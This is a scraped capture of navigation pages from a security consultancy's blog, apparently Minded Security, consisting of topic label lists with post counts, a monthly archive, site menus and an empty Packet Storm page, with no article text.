  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* Magento

  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from packetstormsecurity.com_dd8d831f_20250124_161725.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from blog.mindedsecurity.com_07fe6254_20250126_020835.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

No posts with label **R**. [Show all posts](https://blog.mindedsecurity.com/)

No posts with label **R**. [Show all posts](https://blog.mindedsecurity.com/)

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
